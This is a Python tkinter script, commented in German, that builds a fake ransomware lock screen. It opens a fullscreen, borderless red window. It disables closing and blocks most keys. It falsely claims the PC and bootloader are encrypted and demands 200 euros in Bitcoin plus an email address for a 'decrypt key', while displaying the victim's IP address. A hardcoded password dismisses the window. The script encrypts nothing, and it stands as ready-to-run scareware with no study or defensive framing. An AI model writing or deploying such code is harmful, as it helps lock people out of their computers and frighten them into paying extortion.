import tkinter as tk
import socket

# Funktion zur Ermittlung der lokalen IP-Adresse
def get_ip():
    return socket.gethostbyname(socket.gethostname())

# Hauptfenster erstellen
root = tk.Tk()
root.attributes('-fullscreen', True)  # Vollbildmodus aktivieren
root.protocol("WM_DELETE_WINDOW", lambda: None)  # Deaktiviert das Schließen durch das X
root.resizable(False, False)  # Verhindert das Vergrößern oder Verkleinern des Fensters
root.configure(bg='red')

top_label = tk.Label(root, text='YOU PC GOT ENCRYPTED', bg='red', fg='white', font=('Helvetica', 30))
top_label.pack(pady=50)

top_label = tk.Label(root, text='YOU BOOTLOADER IS ENCRYPTED', bg='red', fg='white', font=('Helvetica', 20))
top_label.pack(pady=50)

top_label = tk.Label(root, text='YOUR rAT TEAM We are The Reals', bg='red', fg='white', font=('Helvetica', 10))
top_label.pack(pady=50)

label = tk.Label(root, text='DECRYPT KEY:', bg='red', fg='white', font=('Helvetica', 20))
label.pack(pady=50)

password_entry = tk.Entry(root, show='', font=('Helvetica', 20))
password_entry.pack(pady=20)
password_entry.focus()

# Anzeige der IP-Adresse unter dem Eingabefeld
ip_label = tk.Label(root, text=f"Your IP: {get_ip()}", bg='red', fg='white', font=('Helvetica', 18))
ip_label.pack(pady=10)

# Anzeige der Bitcoin-Adresse unter der IP
btc_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"  # Beispiel einer Bitcoin-Adresse
btc_label = tk.Label(root, text=f"Send BTC to: {btc_address}", bg='red', fg='white', font=('Helvetica', 18))
btc_label.pack(pady=10)

extra_label1 = tk.Label(root, text='Welcome to the rAT you got Rated', bg='red', fg='white', font=('Helvetica', 18))
extra_label1.pack(side="bottom", pady=10)

extra_label2 = tk.Label(root, text='send us 200€ In BTC', bg='red', fg='white', font=('Helvetica', 18))
extra_label2.pack(side="bottom", pady=10)

extra_label3 = tk.Label(root, text='and give us your Email Adress to send the key', bg='red', fg='white', font=('Helvetica', 18))
extra_label3.pack(side="bottom", pady=10)

# Funktion, um das Passwort zu überprüfen
def check_password(event=None):
    password = password_entry.get()
    if password == "f1k3v9wp5j7q0r2xz6g8s4":  # Das Passwort zum Beenden des Fensters
        root.quit()

# Bindet die Enter-Taste, um die Passwortüberprüfung auszulösen
root.bind('<Return>', check_password)

# Blockiert alle Tastenaktionen, die das Fenster schließen könnten
def block_all(event):
    # Erlaubte Zeichen: Buchstaben (a-z, A-Z), Zahlen (0-9) und Sonderzeichen
    allowed_characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"

    # Wenn das gedrückte Zeichen im erlaubten Bereich ist, lassen wir es durch
    if event.char in allowed_characters:
        return None

    # Alle anderen Tasten blockieren (einschließlich modifizierende Tasten wie Shift, Control, Alt, etc.)
    # Hier blockieren wir alle Tasten, die wir nicht explizit erlauben
    return "break"  # Verhindert die Eingabe von allen anderen Tasten

# Blockiert alle Tasten, die keine erlaubten Zeichen sind
root.bind('<Key>', block_all)

# Entfernt alle Fensterrahmen und Steuerelemente
root.overrideredirect(True)

root.mainloop()
